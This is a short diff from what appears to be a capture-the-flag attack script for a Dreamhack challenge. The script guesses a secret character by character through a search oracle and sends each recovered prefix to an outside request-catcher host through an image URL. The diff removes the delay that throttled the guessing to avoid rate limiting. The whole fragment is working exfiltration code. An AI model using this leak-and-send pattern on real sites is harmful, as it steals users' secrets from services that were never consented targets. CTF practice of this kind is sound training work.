@@ -40,7 +40,6 @@
                     let found = false;
 
                     for (let c of chars) {
-                        await new Promise(resolve => setTimeout(resolve, 100)); // Delay to avoid rate limiting
                         if (await search(secret + c)) {
                             secret += c;
                             new image().src = `https://pdvsomq.request.dreamhack.games?secret=${secret}`;
